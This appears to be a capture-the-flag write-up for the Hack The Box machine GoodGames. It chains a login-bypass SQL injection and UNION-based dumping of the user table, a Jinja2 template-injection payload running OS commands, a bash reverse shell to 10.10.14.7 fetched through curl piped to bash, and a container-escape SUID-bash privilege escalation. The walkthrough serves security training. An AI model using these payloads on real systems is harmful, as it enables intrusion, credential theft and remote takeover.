---
title: Goodgames Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

# Enumeration

We launch an nmap and get the following results:


```ruby
Scanned at 2022-11-07 12:16:17 CET for 13s
Not shown: 65534 closed tcp ports (reset)
PORT STATE SERVICE REASON
80/tcp open http syn-ack ttl 63
```

So let's analyze the page.

We launch a dirsearch:

```bash
dirsearch -u http://10.129.154.140 -x 404 -t 200
```

If we enter the page and go to the login section after creating an account, we can see how the login panel is vulnerable to SQL injections, so we put this in the burp:
```shell
email=admin%40admin.php'or 1=1-- -&password=xd
```

and we enter the admin account, whose credentials are:

```shell
Nickname: admin  
Email: admin@goodgames.htb  
Date joined: NULL
```

However, from here we can not draw anything, but the conclusion that the field to enter user at the time of logging is vulnerable, so we put a sql injection to get the number of columns that exist, which are 4:

```shell
email=admin%40goodgames.htb' order by 4-- -&password=admin
```

If we play with the union select and group_concat, we can see how the fourth column is the injectable one, so that is where we put our commands, so we get the existing databases:

```sql
' union select 1,2,3,group_concat(schema_name) from information_schema.schemata-- - &password=admin
```

and it reports us the DB information_schemamain and main, so now we try to get the name of the tables from the main DB playing once again with group_concat.

```sql
' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema="main"-- -&password=admin
```

The following tables are reported to us:

```sql
-Blog
-Blog comments
-User
```

So we look up the columns of the users table:

```sql
' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema="main" and table_name="user"-- -&password=admin
```

And we get the following results:

```sql
-Email
-ID
-Name 
-Password
```

Now we show the information of the users table:

```postgresql
' union select 1,2,3,group_concat(name,0x3a, password) from user-- -&password=admin
```

Where it reports the user ADMIN and its encrypted password, so we decrypt it in crackstation and we have the following credentials

```sql
user: Admin
password: superadministrator
```

Then we take the administrator user out of the database:

```mariadb
USER()-- -
```

and we have that it is main_admin@localhost, so let's see what permissions this one has:

```sql
' union select 1,2,3,PRIVILEGE_TYPE FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee="'MAIN_ADMIN'@'LOCALHOST'"-- -&password=admin
```

But it only reports `Usage`, so we have to find another way to see what permissions it has.

So we are going to look for which database manager we are using with the `version()` command, and it gives us the answer, so we know we are dealing with MySQL. 

However, the intrusion cannot be carried out here, so we go to the page, we log in with admin, and when we click on the settings wheel it takes us to a new page (but first we have to add the subdomain and the ip in /etc/hosts). 

Once we access to the page, we see that we are in front of a flask, so we HAVE TO TRY STTI inside the "Full name" field, since it is the only one injectable.

So we go to payloadallthethings, and with the following command:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

But we are in a container, so we are going to send an IMP trace to see if we have connectivity to the machine:

So first we check if we have external trace with DCPDUMP:
```shell
tcpdump -i tun0 icmp -n
```

and we send a ping from the web/victim_machine, and we receive the packet.

Therefore we create an index.html with a rev shell
````bash
index.html

#!/bin/bash
bash -i >& /dev/tcp/10.10.14.7/443 0>&1
```

so first we create a web sv with `python -m http.server'. 
we upload it to the victim machine with a CURL | bash -c to pipe it with bash and send us the Revshell.

However, we are in a docker, so we have to get out of it. To do this, we set up a bash script to do the nmap functions:

````bash
#!bin/bash

function ctrl_c() {
    echo -e "Exiting...\n"
    tput cnorm; exit 1
}

#ctrl+c
trap ctrl_c INT

tput civis

for port in $(seq 1 65535); do
    timeout 1 bash -c "echo '' > /dev/tcp/IP/$port" 2>/dev/null && echo "[+]Port $port $port - OPEN" &
done; wait
tput cnorm
```

And with this we get that the SSH port is open so we connect via ssh


# Root exploit

as the /home/augustus is mounted inside the container, and we just access the container we are root, 
we exit the ssh and do `cp /bin/bash .` And from the root container we assign owner and group to root with 
`chown root:root bash` , and we give SUID with `chmod 4755 bash` , 
so we can run the bash as root using the parameter -p `./bash -p` and we already have the root flag.
